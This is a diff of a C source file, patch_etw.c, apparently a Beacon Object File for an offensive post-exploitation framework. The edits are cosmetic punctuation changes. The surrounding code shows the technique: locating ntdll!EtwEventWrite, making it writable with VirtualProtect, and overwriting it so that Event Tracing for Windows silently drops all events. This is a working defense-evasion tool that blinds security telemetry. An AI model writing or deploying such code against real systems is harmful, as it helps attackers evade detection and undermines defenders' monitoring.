@@ -1,5 +1,5 @@
 /*
- * patch_etw.c — Patch EtwEventWrite to silently drop all events
+ * patch_etw.c - Patch EtwEventWrite to silently drop all events
  *
  * Overwrites the first bytes of ntdll!EtwEventWrite with a stub
  * that returns STATUS_SUCCESS (0), effectively blinding any ETW
@@ -20,7 +20,7 @@ DFR(KERNEL32, VirtualProtect)
 
 void go(char* args, int len)
 {
-    /* ntdll.dll is always loaded — use GetModuleHandle, not LoadLibrary */
+    /* ntdll.dll is always loaded - use GetModuleHandle, not LoadLibrary */
     HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
     if (hNtdll == NULL) {
         BeaconPrintf(CALLBACK_ERROR, "patch_etw: GetModuleHandleA(\"ntdll.dll\") failed (err %lu)",
@@ -64,5 +64,5 @@ void go(char* args, int len)
     DWORD tmp = 0;
     KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, patchLen, oldProtect, &tmp);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "ETW patched — EtwEventWrite now returns STATUS_SUCCESS (no-op)");
+    BeaconPrintf(CALLBACK_OUTPUT, "ETW patched - EtwEventWrite now returns STATUS_SUCCESS (no-op)");
 }
